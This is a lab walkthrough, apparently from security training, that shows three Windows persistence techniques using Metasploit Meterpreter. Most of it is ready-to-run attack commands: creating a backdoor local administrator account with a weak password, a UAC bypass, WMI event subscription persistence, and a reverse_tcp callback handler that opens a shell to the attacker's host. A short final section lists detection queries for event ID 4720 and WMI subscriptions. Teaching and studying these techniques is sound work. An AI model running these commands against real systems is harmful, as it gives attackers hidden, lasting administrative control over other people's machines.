#### Deploying three persistence methods using Metasploit Meterpreter

#### Establish Meterpreter C2
###### Launching a script called `psexec.rc` using Metasploit
```
msfconsole -q -r labs/quick/psexec.rc
```

#### Persistence 1 - Add a Local Administrative User
###### The 'execute' function accepts the command to run with the '-f' argument interactively with '-i' argument.
```
execute -if whoami
execute -if 'net user /add assetmgt Password1'
execute -if 'net localgroup administrator /add assetmgt'
execute -if 'net user'
execute -if 'net localgroup administrators'
```

#### Persistence 2 - WMI Event Subscription
###### The WMI event subscription persistence technique must be used with a user process that has bypassed UAC permissions. To accommodate this migrate to explorer.exe 
```
migrate -N explorer.exe
```
###### In order to apply the WMI event subscription persistence method, an attacker needs to bypass the User Access Control (UAC) prompt.
```
background
use exploit/windows/local/bypassuac_injection
set lhost ip
set session 1
run
bg
```

```
use exploit/windows/local/wmi_persistence
set session 2
set lhost ip 
set username_trigger mssqladmin
run
reboot Windows
```

#### Establish Callback Handler
###### For reverse TCP meterpreter session, the attacker must be listening and waiting for the connection
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost ip
run
```

#### Trigger the WMI Event Subscription Persistence
###### The persistence mechanism waits for a user to attempt to login using the username 'mssqladmin' with an incorrect password
```
smbclient //ip/C$ -U mssqladmin%badpass
```

#### Local User Analyis
###### Some options to detect these persistence methods
```
net user
```
###### What if we didn't know which users were valid? We can look for recently created user accounts, which can be found by interrogating the Security event log for Event ID 4720
```
Get-WinEvent -FilterHashtable @{ Logname='Security'; ID=4720} | fl - property timecreated, message
Get-WMIObject -Namespace root\Subscription -Class __EventFilter | fl -property *
```
###### To find the process of the event
```
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer | fl -property *
```

